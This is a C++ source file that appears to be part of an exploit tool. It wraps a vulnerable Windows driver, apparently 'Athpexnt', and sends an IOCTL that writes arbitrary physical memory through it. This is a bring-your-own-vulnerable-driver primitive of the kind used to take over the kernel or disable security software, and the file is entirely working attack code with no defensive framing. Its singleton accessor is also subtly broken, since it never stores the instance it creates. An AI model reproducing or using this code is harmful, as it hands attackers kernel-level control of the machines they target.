#include <include/driver/primitives.hpp>

Driver::Athpexnt* Driver::Athpexnt::GetInstance()
{
    static Athpexnt* VulnDriverInstance;
    return VulnDriverInstance ? VulnDriverInstance : new Athpexnt();
}

bool Driver::Athpexnt::WritePhysicalMemory(const void* To, const void* From, const std::uint32_t Size) const
{
    const MemoryWriteIoctlPacket IoctlPacketData(
        reinterpret_cast<std::uint64_t>(To),
        reinterpret_cast<std::uint64_t>(From),
        Size
    );

    std::uint32_t BytesReturned = 0;
    if (!DeviceIoControl(this->DriverHandle,
        WritePrimitiveDispatchCode,
        const_cast<LPVOID>(reinterpret_cast<const void*>(&IoctlPacketData)),
        sizeof(MemoryWriteIoctlPacket),
        nullptr,
        NULL,
        reinterpret_cast<LPDWORD>(&BytesReturned),
        NULL
    ))
    {
        return false;
    }

    return true;
}